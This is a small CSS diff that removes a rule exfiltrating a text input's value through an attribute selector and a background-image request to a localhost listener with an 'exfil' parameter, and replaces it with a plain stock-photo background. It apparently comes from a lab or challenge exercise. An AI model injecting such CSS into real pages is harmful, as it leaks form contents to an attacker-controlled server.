@@ -3,7 +3,7 @@ body {
     color: white;
   }
   
-  input[value^="secret_msg"] {
-    background-image: url("http://localhost:4000/?exfil=secret_msg");
+  input[type="text"] {
+    background-image: url("https://img.freepik.com/free-photo/red-paper-background-elegant-scarlet-background-for-holiday-decoration-or-web-design-paper-texture_166373-2152.jpg?size=626&ext=jpg&ga=GA1.1.1788614524.1717718400&semt=ais_user");
   }
   
